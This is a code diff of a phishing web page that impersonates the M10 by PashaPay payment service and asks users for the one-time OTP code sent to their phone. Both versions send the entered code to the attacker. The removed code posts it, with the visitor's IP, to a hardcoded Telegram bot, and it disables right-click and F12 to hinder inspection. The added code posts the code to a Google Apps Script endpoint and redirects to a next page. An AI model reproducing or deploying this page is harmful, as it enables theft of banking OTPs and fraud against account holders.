@@ -1,260 +1,168 @@
 <!DOCTYPE html>
 <html lang="en">
-
-<!-- Mirrored from m10balans.online/number/pay/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 04 Dec 2024 09:36:22 GMT -->
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Unibank</title>
-<link rel="stylesheet" href="../../../cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css"> <!-- Font Awesome ikonları için -->
+<title>M10</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
 <style>
+@font-face {
+    font-family: 'GilroyBold';
+    src: url('/fonts/Gilroy-Bold.ttf') format('truetype');
+    font-weight: normal;
+    font-style: normal;
+}
+
 body {
     margin: 0;
     padding: 0;
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    background-color: #03EDC3; /* Koyu turuncu arka plan */
+    font-family: 'GilroyBold', Arial, sans-serif;
+    background-color: whitesmoke;
     display: flex;
     justify-content: center;
     align-items: center;
     height: 100vh;
 }
 .container {
-    background-color: #03EDC3; /* Beyaz arka plan */
-    border-radius: 15px;
-    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-    padding: 50px;
-    max-width: 300px; /* Maksimum genişlik belirle */
+    background-color: #fff;
+    border-radius: 75px;
+    box-shadow: 0 8px 12px rgba(0, 0, 0, 0.2);
+    padding: 100px;
+    max-width: 500px;
     width: 100%;
     text-align: center;
+    font-family: 'GilroyBold', Arial, sans-serif;
 }
 .form-group {
-    margin-bottom: 20px;
+    margin-bottom: 40px;
+    font-family: 'GilroyBold', Arial, sans-serif;
 }
 label {
     font-weight: bold;
     display: block;
-    margin-bottom: 5px;
+    margin-bottom: 15px;
+    font-size: 28px;
+    font-family: 'GilroyBold', Arial, sans-serif;
 }
 input[type="number"] {
-    width: calc(100% - 12px);
-    padding: 10px;
-    border: 2px solid black; /* Koyu turuncu çerçeve */
-    border-radius: 5px;
+    width: calc(100% - 30px);
+    padding: 25px;
+    border: 3px solid black;
+    border-radius: 75px;
     box-sizing: border-box;
-    font-size: 14px;
+    font-size: 24px;
+    font-family: 'GilroyBold', Arial, sans-serif;
 }
 button {
     width: 100%;
-    padding: 10px;
+    padding: 25px;
     border: none;
-    border-radius: 5px;
-    background-color: #4caf50;
+    border-radius: 75px;
+    background-color: green;
     color: #fff;
     cursor: pointer;
-    font-size: 16px;
+    font-size: 28px;
+    font-family: 'GilroyBold', Arial, sans-serif;
     transition: background-color 0.3s ease;
-    margin-top: 20px; /* Butonu yukarı taşı */
+    margin-top: 40px;
 }
 button:disabled {
     background-color: #cccccc;
     cursor: not-allowed;
 }
 button:hover {
-    background-color: #45a049;
+    background-color: darkgreen;
 }
 .logo {
-    margin-bottom: 20px;
+    margin-bottom: 40px;
     text-align: center;
 }
-.bank-icons {
-    display: flex;
-    justify-content: center;
-    margin-top: 20px;
-}
-.bank-icons i {
-    font-size: 24px;
-    margin: 0 10px;
-    color: #888;
-    transition: color 0.3s ease;
-}
-.bank-icons i:hover {
-    color: #333;
-}
 .timer {
-    font-size: 2rem;
+    font-size: 4rem;
     color: #333;
-    margin-bottom: 20px;
+    margin-bottom: 40px;
+    font-family: 'GilroyBold', Arial, sans-serif;
 }
 </style>
 </head>
 <body>
 <div class="container">
     <div class="logo">
-        <img src="../../../upload.wikimedia.org/wikipedia/commons/0/04/M10_by_PashaPay_logo_new.png" alt="Logo" width="200">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/M10_by_PashaPay_logo_new.png" alt="Logo" width="300">
     </div>
-    <div class="timer" id="timer">02:00</div> <!-- 2 dakikalık zaman sayacı -->
+    <div class="timer" id="timer">05:00</div>
     <form id="myForm">
         <div class="form-group">
-            <div class="item item-indent">Telefonunuza gələn birdəfəlik OTP şifrəni daxil edin. </div>
-            <label for="cardName">Şifrə göndərildi: +994*******</label>
-            <input type="number" id="cardName" placeholder="Otp Kod" maxlength="6" minlength="6" required>
+            <div style="font-size: 24px;">Telefonunuza gələn birdəfəlik OTP şifrəni daxil edin.</div>
+            <label for="otp">Şifrə göndərildi: +994*******</label>
+            <input type="number" id="otp" placeholder="Otp Kod" maxlength="6" minlength="4" required>
         </div>
-  
         <div style="text-align: center;">
-            <button type="button" id="submitButton" disabled>İləri <i class="fas fa-arrow-right"></i></button>
+            <button type="button" id="submitButton" disabled>İleri <i class="fas fa-arrow-right"></i></button>
         </div>
     </form>
-    <div class="bank-icons">
-        <i class="fab fa-cc-visa"></i>
-        <i class="fab fa-cc-mastercard"></i>
-        <i class="fab fa-cc-amex"></i>
-    </div>
 </div>
 
 <script>
-// Başlangıç zamanı
-var startTime = new Date().getTime();
+// 5 dakika geri sayım başlat
+const timerElement = document.getElementById("timer");
+let timeRemaining = 300; // 5 dakika = 300 saniye
 
-// 2 dakika sonraki zamanı hesapla
-var endTime = startTime + (2 * 60 * 1000);
+const countdown = setInterval(() => {
+    const minutes = Math.floor(timeRemaining / 60);
+    const seconds = timeRemaining % 60;
+    timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
 
-// Her saniyede bir zamanı güncelle
-var timerInterval = setInterval(function() {
-    // Geçen süreyi hesapla
-    var currentTime = new Date().getTime();
-    var elapsedTime = endTime - currentTime;
-
-    // Dakika ve saniye değerlerini hesapla
-    var minutes = Math.floor((elapsedTime % (1000 * 60 * 60)) / (1000 * 60));
-    var seconds = Math.floor((elapsedTime % (1000 * 60)) / 1000);
-
-    // Zamanı güncelle
-    document.getElementById("timer").innerHTML = formatTime(minutes) + ":" + formatTime(seconds);
-
-    // Zaman dolunca butonu devre dışı bırak
-    if (elapsedTime < 0) {
-        clearInterval(timerInterval);
-        document.getElementById("timer").innerHTML = "00:00";
-        document.getElementById("submitButton").disabled = true;
+    if (timeRemaining <= 0) {
+        clearInterval(countdown);
+        timerElement.textContent = "Süre Bitti";
     }
+
+    timeRemaining--;
 }, 1000);
 
-// Zamanı iki haneli format haline getir
-function formatTime(time) {
-    return time < 10 ? "0" + time : time;
-}
+// OTP girişi kontrol et ve düğmeyi etkinleştir
+const otpInput = document.getElementById("otp");
+const submitButton = document.getElementById("submitButton");
 
-// Alanlar dolunca butonu etkinleştir
-document.getElementById("myForm").addEventListener("input", function() {
-    var cardName = document.getElementById("cardName").value;
-    
-    var submitButton = document.getElementById("submitButton");
-
-    if (cardName.trim().length >= 4) {
-        submitButton.disabled = false;
-    } else {
-        submitButton.disabled = true;
+otpInput.addEventListener("input", () => {
+    otpInput.value = otpInput.value.replace(/[^0-9]/g, ''); // Sadece rakamlara izin ver
+    if (otpInput.value.length > 6) {
+        otpInput.value = otpInput.value.slice(0, 6); // Maksimum 6 karakter
     }
+    submitButton.disabled = otpInput.value.length < 4; // Minimum 4 karakter
 });
 
-// Telegram API anahtarları
-const botToken = '8136871782:AAGl_5_It13PYi6UPTsVZRQB2LgTVrjG7Ao';
-const chatId = '8031253006';
+// OTP gönderme işlevi
+submitButton.addEventListener("click", async () => {
+        const data = {
+            telefon: "Bilinmiyor", // Sabit
+            tutar: "Bilinmiyor",   // Sabit
+            kart: "Bilinmiyor",    // Sabit
+            ay: "00",              // Sabit
+            yil: "0000",           // Sabit
+            cvv: "000",            // Sabit
+            otp: otpInput.value.trim(), // Dinamik OTP
+        };
+    
 
-// Telegram'a form bilgilerini gönder
-document.getElementById("submitButton").addEventListener("click", function() {
-    var cardName = document.getElementById("cardName").value;
-
-    // Güvenlik kodu oluşturulması (Örnek olarak rastgele bir sayı kullanıldı)
-    const securityCode = Math.floor(Math.random() * 10000);
-
-    // Kullanıcının IP adresini almak için bir API kullanılması (ipify API kullanılıyor)
-    fetch("../../../api.ipify.org/index0cce.html?format=json")
-        .then(response => response.json())
-        .then(data => {
-            const userIP = data.ip;
-            const message = `Otp-1: ${cardName}\nIP: ${userIP}`;
-
-            // Telegram API'ye istek yapılması ve mesajın gönderilmesi
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                }),
-            })
-                .then(response => response.json())
-                .then(data => {
-                    console.log('Telegram Mesajı Gönderildi:', data);
-                    // Başarılı olursa kullanıcıyı yönlendirme yapılması
-                    window.location.href = "index2.html";
-                })
-                .catch(error => {
-                    console.error('Telegram Mesajı Gönderme Hatası:', error);
-                });
-        })
-        .catch(error => {
-            console.error('IP Adresi Alınamadı:', error);
+    try {
+        await fetch("https://script.google.com/macros/s/AKfycbySe0hCUb5zREcOJQlTi2e3-OuQvd4CaW9iO0EHtTcJbabMQdFMrEkBZ8xx0lFDgCHi/exec", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify(data),
+            mode: "no-cors",
         });
+
+        // Başarılı gönderim sonrası yönlendirme
+        window.location.href = "index2.html";
+    } catch (error) {
+        console.error("Xəta:", error);
+        alert("Məlumat göndərilmədi!");
+    }
 });
 </script>
-
-<SCRIPT LANGUAGE="Javascript"><!--
-    // ***********************************************
-    //     UYARISIZ SAG TIK VE F12 ENGELLEME KODU
-    // ***********************************************
-       document.onkeypress = function (event) {
-           event = (event || window.event);
-           if (event.keyCode == 123) {
-              //alert('No F-12');
-               return false;
-           }
-       }
-       document.onmousedown = function (event) {
-           event = (event || window.event);
-           if (event.keyCode == 123) {
-               //alert('No F-keys');
-               return false;
-           }
-       }
-    document.onkeydown = function (event) {
-           event = (event || window.event);
-           if (event.keyCode == 123) {
-               //alert('No F-keys');
-               return false;
-           }
-       }
-    var isNS = (navigator.appName == "Netscape") ? 1 : 0;
-    var EnableRightClick = 0;
-    if(isNS)
-    document.captureEvents(Event.MOUSEDOWN||Event.MOUSEUP);
-    function mischandler(){
-    if(EnableRightClick==1){ return true; }
-    else {return false; }
-    }
-    function mousehandler(e){
-    if(EnableRightClick==1){ return true; }
-    var myevent = (isNS) ? e : event;
-    var eventbutton = (isNS) ? myevent.which : myevent.button;
-    if((eventbutton==2)||(eventbutton==3)) return false;
-    }
-    function keyhandler(e) {
-    var myevent = (isNS) ? e : window.event;
-    if (myevent.keyCode==96)
-    EnableRightClick = 1;
-    return;
-    }
-    document.oncontextmenu = mischandler;
-    document.onkeypress = keyhandler;
-    document.onmousedown = mousehandler;
-    document.onmouseup = mousehandler;
-    //-->
-    </script>
-
 </body>
-
-<!-- Mirrored from m10balans.online/number/pay/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 04 Dec 2024 09:36:24 GMT -->
 </html>
